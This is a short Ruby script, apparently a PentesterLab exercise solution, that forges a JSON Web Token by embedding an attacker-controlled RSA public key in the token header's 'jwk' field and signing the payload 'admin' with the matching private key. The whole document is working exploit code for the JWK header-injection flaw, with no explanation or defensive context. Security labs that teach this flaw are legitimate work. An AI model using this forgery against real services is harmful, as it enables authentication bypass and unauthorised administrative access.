require 'openssl'
require 'base64'
require 'json'

priv = OpenSSL::PKey::RSA.new File.read 'private.pem'

pub = priv.public_key
n= Base64.urlsafe_encode64(pub.n.to_s(2)).gsub(/=+$/,"")
e= Base64.urlsafe_encode64(pub.e.to_s(2)).gsub(/=+$/,"")
header = {"alg" => "RS256", "jwk" => {"kty" => "RSA", "kid" => "pentesterlab",
                                      "use" => "sig", "n" => n, "e" => e }}
payload = Base64.urlsafe_encode64("admin").gsub(/=+$/,"")

token = Base64.urlsafe_encode64(header.to_json).gsub(/=+$/,"")+"."+payload

sign = priv.sign("SHA256", token)

puts token+"."+Base64.urlsafe_encode64(sign).gsub(/=+$/,"")

